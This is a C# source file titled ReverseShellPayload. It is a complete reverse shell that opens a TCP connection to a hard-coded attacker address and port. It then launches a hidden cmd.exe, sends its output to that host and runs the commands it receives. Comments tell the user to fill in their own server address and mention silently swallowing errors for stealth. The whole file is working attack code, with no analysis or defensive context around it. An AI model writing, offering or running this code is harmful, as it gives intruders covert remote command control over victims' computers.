using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace ReverseShellPayload
{
    class Program
    {
        static void Main(string[] args)
        {
            // Change these to your controlled server's IP address and port
            string attackerIP = "100.0.0.16";
            int attackerPort = 4444;

            try
            {
                using (TcpClient client = new TcpClient(attackerIP, attackerPort))
                using (NetworkStream stream = client.GetStream())
                {
                    // Start a hidden command prompt process
                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardInput = true;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;
                    process.Start();

                    // Begin reading output asynchronously
                    process.OutputDataReceived += (sender, e) =>
                    {
                        if (!String.IsNullOrEmpty(e.Data))
                        {
                            byte[] data = Encoding.ASCII.GetBytes(e.Data + Environment.NewLine);
                            stream.Write(data, 0, data.Length);
                            stream.Flush();
                        }
                    };
                    process.ErrorDataReceived += (sender, e) =>
                    {
                        if (!String.IsNullOrEmpty(e.Data))
                        {
                            byte[] data = Encoding.ASCII.GetBytes(e.Data + Environment.NewLine);
                            stream.Write(data, 0, data.Length);
                            stream.Flush();
                        }
                    };

                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();

                    // Continuously read commands from the network stream and forward them to cmd.exe
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        string input = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                        process.StandardInput.WriteLine(input);
                    }
                }
            }
            catch (Exception ex)
            {
                throw ex;
                // Optionally handle errors or log them in a controlled environment
                // In a stealth scenario, you might silently ignore errors.
            }
        }
    }
}